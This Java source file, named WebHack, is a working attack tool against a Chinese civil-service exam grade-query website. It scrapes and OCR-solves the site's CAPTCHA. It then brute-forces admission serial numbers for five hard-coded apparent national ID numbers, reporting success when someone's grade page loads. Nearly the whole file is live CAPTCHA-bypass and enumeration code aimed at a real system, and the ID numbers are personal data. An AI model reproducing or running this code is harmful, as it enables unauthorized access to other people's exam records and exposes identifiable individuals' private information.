import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.imageio.ImageIO;


public class WebHack {
	private static final int COLOR_SEPERATOR = 250*2+130; 
	private static int TRAINED_COUNT = 	0;
	private static int ORIGIN_COUNT = 	0;
	private static int TIME_TRAINPIC = 	400; //ms
	private static int TIME_QUERY = 	100; //ms
	private static String ORIGIN_PRE = "origin";
	private static final String SERVLET_POST = "POST" ;
    private static final String SERVLET_GET = "GET" ;
    private static final String HOSTPREWORD = "http://bm.scs.gov.cn/2015";
    private static final String PATH_ORIGINPIC = "originpic";
    private static final String PATH_TMPPIC = "temppic";
    private static final String PATH_TRAINEDPIC = "trainedpic";
    private static final String URL_TRAINPIC = "http://bm.scs.gov.cn/2015/UserControl/Student/GradeQuery.aspx";		//首页的网址
    private static final String URL_GRADEQUERY = "http://bm.scs.gov.cn/2015/UserControl/Student/GradeQuery.aspx";	// 查询时提交的网址
    private static final String URL_REFERER = "http://bm.scs.gov.cn/2015/UserControl/Student/GradeQuery.aspx";
    private static Map<BufferedImage, String> trainedMap = null;
    
    /*
     * 返回白点
     */
	public static int isWhite(int colorInt) {
		Color color = new Color(colorInt);
		if (color.getRed() + color.getGreen() + color.getBlue() >= COLOR_SEPERATOR) {
			return 1;
		}
		return 0;
	}

	/*
	 * 返回黑点
	 */
	public static int isBlack(int colorInt) {
		Color color = new Color(colorInt);
		if (color.getRed() + color.getGreen() + color.getBlue() < COLOR_SEPERATOR) {
			return 1;
		}
		return 0;
	}

	/*
	 * 去除背景色，将图片转为非黑即白
	 */
	public static BufferedImage removeBackgroud(String picFile)
			throws Exception {
		BufferedImage img = ImageIO.read(new File(picFile));
		int width = img.getWidth();
		int height = img.getHeight();
		for (int x = 0; x < width; ++x) {
			for (int y = 0; y < height; ++y) {
				if (isWhite(img.getRGB(x, y)) == 1) {
					img.setRGB(x, y, Color.WHITE.getRGB());
				} else {
					img.setRGB(x, y, Color.BLACK.getRGB());
				}
			}
		}
		return img;
	}

	/*
	 * 本函数只针对”公务员成绩查询网站”的验证码
	 * 实现验证码中数字字母的提取
	 */
	public static List<BufferedImage> splitImage(BufferedImage img)
			throws Exception {
		List<BufferedImage> subImgs = new ArrayList<BufferedImage>();
		subImgs.add(img.getSubimage(5, 3, 10, 18));
		subImgs.add(img.getSubimage(16, 3, 10, 18));
		subImgs.add(img.getSubimage(27, 3, 10, 18));
		subImgs.add(img.getSubimage(38, 3, 10, 18));
		subImgs.add(img.getSubimage(49, 3, 10, 18));
		return subImgs;
	}

	/*
	 * TrainedPic是图片库文件夹
	 * 从该文件夹下加载图片库到Map中，将文件与数字字母对应
	 */
	public static Map<BufferedImage, String> loadTrainData() throws Exception {
		Map<BufferedImage, String> map = new HashMap<BufferedImage, String>();
		File dir = new File(PATH_TRAINEDPIC);
		File[] files = dir.listFiles();
		for (File file : files) {
			String name = file.getName().split("\\.")[0];
			if((name.length() == 2 && name.charAt(1) == '1') || 
					(name.length() == 1)){
				map.put(ImageIO.read(file), name.charAt(0) + "");					// 数字或者小写字母
			}else if(name.length() == 2 && name.charAt(1) == '2'){
				map.put(ImageIO.read(file), (name.charAt(0) + "").toUpperCase());	// 大写字母
			}
		}
		return map;
	}

	/*
	 * 将字母与图片库中每幅图逐个像素对比，找到最相似的
	 */
	public static String getSingleCharOcr(BufferedImage img,
			Map<BufferedImage, String> map) {
		String result = "";
		int width = img.getWidth();
		int height = img.getHeight();
		int min = width * height;
		for (BufferedImage bi : map.keySet()) {
			int count = 0;
			Label1: for (int x = 0; x < width; ++x) {
				for (int y = 0; y < height; ++y) {
					if (isWhite(img.getRGB(x, y)) != isWhite(bi.getRGB(x, y))) {
						count++;
						if (count >= min)
							break Label1;
					}
				}
			}
			if (count < min) {
				min = count;
				result = map.get(bi);
			}
		}
		return result;
	}

	/*
	 * 识别验证码图片
	 */
	public static String getAllOcr(String file) throws Exception {
		BufferedImage img = removeBackgroud(PATH_ORIGINPIC + "\\" + file);
		List<BufferedImage> listImg = splitImage(img);
		String result = "";
		for (BufferedImage bi : listImg) {
			result += getSingleCharOcr(bi, trainedMap);
		}
		return result;
	}

	/*
	 * 原始验证码图片切割成众多字母图片，并保存
	 */
	public static void getTrainedPic(String file) throws Exception{
		BufferedImage img = removeBackgroud(file);
		List<BufferedImage> listImg = splitImage(img);
		for(BufferedImage bi : listImg){
			ImageIO.write(bi, "JPG", new File(PATH_TMPPIC + "\\" + ++TRAINED_COUNT +".jpg"));
		}
	}
	
	/*
	 * 访问登陆网页，正则匹配其中有效参数，以及验证码的网址链接
	 * 访问验证码链接，拿到验证码图片，并保存
	 */
	public static List<Map<String,String>>  doGetTrainPic(Integer nums) throws Exception{
		List<Map<String,String>> list = new ArrayList<Map<String,String>>();
		String patternImg = "<span id=\"lblImage\" .+?src=\'../..(.+?)\'></span>";
		String patternState = "name=\"__VIEWSTATE\".+?value=\"(.+?)\"";
		String patternValid = "name=\"__EVENTVALIDATION\".+?value=\"(.+?)\"";
		while(nums-->0){
			// 批量获取原始验证码信息，用于数据训练
	        URL url = new URL(URL_TRAINPIC);
	        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
	        conn.setRequestMethod(SERVLET_GET);
	        conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
	        conn.setRequestProperty("Cookie", "BIGipServergk_pool=2859663626.38943.0000");
	        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36");
	        conn.connect();
	        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(),"UTF-8"));
	        String line ;
	        String result ="";
	        while( (line =br.readLine()) != null ){
	            result += "\n"+line;
	        }
	        //System.out.println("*********************************************************************************************");
	        //System.out.println(result);
	        //System.out.println("*********************************************************************************************");
	        // 正则表达式提取图片地址
			Pattern pattern_Img = Pattern.compile(patternImg); 
			Pattern pattern_State = Pattern.compile(patternState); 
			Pattern pattern_Valid = Pattern.compile(patternValid); 
	        Matcher matcherImg = pattern_Img.matcher(result); 
	        Matcher matcherState = pattern_State.matcher(result); 
	        Matcher matcherValid = pattern_Valid.matcher(result); 
	        if(!matcherImg.find() || !matcherState.find() || !matcherValid.find()) {
	        	nums++;
	        	continue; 
	        } 
	        String picPath = HOSTPREWORD + matcherImg.group(1);
	        String valueState = matcherState.group(1);
	        String valueValid = matcherValid.group(1);
	        br.close();
	        
	        // 获取图片
	        URL url2 = new URL(picPath);
	        HttpURLConnection conn2 = (HttpURLConnection)url2.openConnection();
	        conn2.setRequestMethod(SERVLET_GET);
	        conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
	        conn2.setRequestProperty("Cookie", "BIGipServergk_pool=2859663626.38943.0000");
	        conn2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36");
	        
	        conn2.connect();
	        BufferedInputStream  in = new BufferedInputStream(conn2.getInputStream());
	        File pic = new File(PATH_ORIGINPIC + "\\" + ORIGIN_PRE + (++ORIGIN_COUNT)+".jpg");
	        FileOutputStream  file = new FileOutputStream(pic);
	        int t;
	        while((t = in.read()) != -1) {
	        	file.write(t);
	        }
	        Map<String,String> map = new HashMap<String,String>();
	        map.put("pic", ORIGIN_PRE + (ORIGIN_COUNT)+".jpg");
	        map.put("state", valueState);
	        map.put("valid", valueValid);
	        list.add(map);
	        file.close();
	        in.close();
	        Thread.sleep(TIME_TRAINPIC);	// 防止过多发送
		}
		return list;
    }
	
	/*
	 * 将拿到的大量验证码原始图片，切割成众多字母数字图片
	 * 用于筛选识别度高的字母图片，放到图片库
	 */
	public static void doTrainPic() throws Exception{
		File f = new File(PATH_ORIGINPIC);
		if(!f.exists()){
			System.out.println("Path Not Exist!");
			return;
		}
		File[] files = f.listFiles();
		int count = 0;
		for(File file : files){
			System.out.println(file.getPath());
			String str[] = file.getPath().split("\\.");
			if(str[1].equals("jpg")){
				getTrainedPic(file.getPath());	// 分割验证码成小图片
				System.out.println("Pic NO." + (TRAINED_COUNT) + "Trained OK!");
			}
		}
		System.out.println("All Trained OK!");
	}
	
	/*
	 * 批量获取待筛选的数字字母图片，用于构造图片库
	 */
	public static void getTrainedPic() throws Exception{
		int numPic = 50;
		/* 下载原始训练图形  */
		doGetTrainPic(numPic); //获取20个图片
		/* 训练图形 */
		doTrainPic();
		/**************************************
		 * 这两步之间有手工操作，挑选图片库的操作！！！
		 *************************************/
		/* 加载图片库 */
		trainedMap = loadTrainData();
		/* 识别图形 */
		for (int i = 1; i <= numPic; ++i) {
			String text = getAllOcr(ORIGIN_PRE + i + ".jpg");
			System.out.println(i + ".jpg = " + text);
		}
	}
	
	/*
	 * 根据传入的参数，提交Form表单，尝试登陆，返回网页
	 */
	public static String GradeQuery(StringBuffer params) throws Exception{
		URL url = new URL(URL_GRADEQUERY);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod(SERVLET_POST);
        conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
        conn.setRequestProperty("Cookie", "BIGipServergk_pool=2859663626.38943.0000");
        conn.setRequestProperty("Referer", URL_REFERER);
        conn.setRequestProperty("Origin", "http://bm.scs.gov.cn");
        conn.setRequestProperty("Host", "bm.scs.gov.cn");
        conn.setRequestProperty("Connection", "keep-alive");
        conn.setRequestProperty("Cache-Control","max-age=0");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
        conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36");
        conn.setDoOutput(true);
        byte[] bypes = params.toString().getBytes();
        conn.getOutputStream().write(bypes);// 输入参数
        InputStream inStream=conn.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(inStream,"UTF-8"));
        String line ;
        String result ="";
        while( (line =br.readLine()) != null ){
            result += "\n"+line;
        }
        System.out.println("**************************************************************************************");
        System.out.println(params.toString());
        //System.out.println(result);
        System.out.println("**************************************************************************************");
        return result;
	}
	
	/*
	 * 模拟一次完整的成绩查询操作：
	 * 1.	打开登陆页面，记录其中有效参数，拿到验证码图片
	 * 2.	识别验证码，得到字符串
	 * 3.	拼凑参数
	 * 4.	提交Form表单，访问数据
	 * 5.	根据返回结果不同，做出不同反应
	 * 		1)	验证码识别错误（有一定概率，因为图片库的质量问题），重新模拟查询操作
	 * 		2)	考生成绩不存在，说明Id与serial不匹配，返回0
	 * 		3)	公共科目笔试成绩结果，证明查询成功，返回1
	 * 		4)	发生未知错误，意味着反悔了404（目前这个问题原因不明，并且经常出现),重新模拟查询请求	
	 */
	public static int HackGradeQuery(Long ID, Long serial) throws Exception{
		while(true){
			StringBuffer params = new StringBuffer();
			/* 下载网页      */
			List<Map<String,String>> result = doGetTrainPic(1);
			/* 获取验证码 */
			String code = getAllOcr(result.get(0).get("pic"));
			/* 设置 参数    */
	        params.append("__EVENTTARGET=&__EVENTARGUMENT=").
	        		append("&btnView=成绩查询").append("&txtIdKey=").append(ID).
	        		append("&txtZkzh=").append(serial).append("&txtCheckId=").append(code).
	        		append("&__VIEWSTATE=").append(result.get(0).get("state")).
	        		append("&__EVENTVALIDATION=").append(result.get(0).get("valid"));
	        String grade = GradeQuery(params);
			Thread.sleep(TIME_QUERY);	// 防止过多发送
	        if(grade.indexOf("验证码输入错误，请您重新输入！")!=-1){	
	        	System.out.println("验证码输入错误，请您重新输入！");
	        	continue;
	        }else if(grade.indexOf("该考生成绩不存在！")!=-1){
	        	System.out.println("该考生成绩不存在！");
	        	return 0;
	        }else if(grade.indexOf("公共科目笔试成绩结果")!=-1){
	        	System.out.println("破解成功！");
	        	return 1;
	        }else{
	        	System.out.println("发生未知错误");
	        	continue;
	        	//return -1;	// 发生未知错误
	        }
		}
	}
	
	/*
	 * 批量模拟成绩查询请求
	 */
	public static void BatchHacking() throws Exception{
		//Long[] idArray = {410927198912262014L};
		Long[] idArray = {370685198911022646L,370725199006172592L, 372929198504131826L, 371202198103080336L, 410927198912262014L};
		Long serial = 819000000L;
		Long Limits = 350L;
		/* 加载图片库  */
		trainedMap = loadTrainData();
		List<Long> idList = Arrays.asList(idArray);
		Map<Long, Long> map = new HashMap<Long, Long>();
		for(Long id : idList){
			for(Long i=0L; i<Limits; i++){
				int flag = HackGradeQuery(id, serial+i);
				if(flag == 1){
					map.put(id, serial+i);
					break;
				}else if(flag == 0){
					continue;
				}else if(flag == -1){
					System.out.println("发生未知错误！！");
					return;
				}
			}
		}
		// 输出结果
		for(Object obj : map.keySet()){
			System.out.println(obj + "  " + map.get(obj));
		}
	}

	/**
	 * @param args
	 * @throws Exception
	 */
	public static void main(String[] args) throws Exception {
		
		// 获取验证码图片库，并进行初步验证
		//getTrainedPic();
		
		// 破解用户的序列号
		BatchHacking();
		
	}
}
